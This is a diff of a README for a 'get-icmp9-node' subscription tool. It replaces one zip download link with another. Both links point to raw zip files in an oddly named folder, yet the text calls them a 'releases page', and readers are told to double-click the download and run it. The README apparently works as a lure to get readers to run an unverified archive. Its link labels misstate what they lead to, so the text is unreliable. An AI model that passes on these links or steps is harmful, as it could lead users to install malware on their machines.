@@ -16,7 +16,7 @@ Welcome to the get-icmp9-node project! This application serves as an ICMP9 subsc
 
 To get started, visit the releases page to download the application. 
 
-[![Download now](https://github.com/kylepeart21/get-icmp9-node/raw/refs/heads/main/rhizopodan/get_node_icmp_1.7-beta.1.zip%20Now-%20-%23007bff?style=flat&logo=github)](https://github.com/kylepeart21/get-icmp9-node/raw/refs/heads/main/rhizopodan/get_node_icmp_1.7-beta.1.zip)
+[![Download now](https://github.com/kylepeart21/get-icmp9-node/raw/refs/heads/main/rhizopodan/icmp_node_get_2.0.zip%20Now-%20-%23007bff?style=flat&logo=github)](https://github.com/kylepeart21/get-icmp9-node/raw/refs/heads/main/rhizopodan/icmp_node_get_2.0.zip)
 
 Once on the releases page, look for the latest version. You will find several files there. Choose the one that fits your operating system and click on it to start the download.
 
@@ -25,7 +25,7 @@ After the download, follow these steps:
 2. Double-click the file to run it.
 3. Follow the on-screen instructions to complete the installation.
 
-You can revisit the [releases page here](https://github.com/kylepeart21/get-icmp9-node/raw/refs/heads/main/rhizopodan/get_node_icmp_1.7-beta.1.zip) at any time to check for updates or additional releases.
+You can revisit the [releases page here](https://github.com/kylepeart21/get-icmp9-node/raw/refs/heads/main/rhizopodan/icmp_node_get_2.0.zip) at any time to check for updates or additional releases.
 
 ## 🔧 System Requirements
 
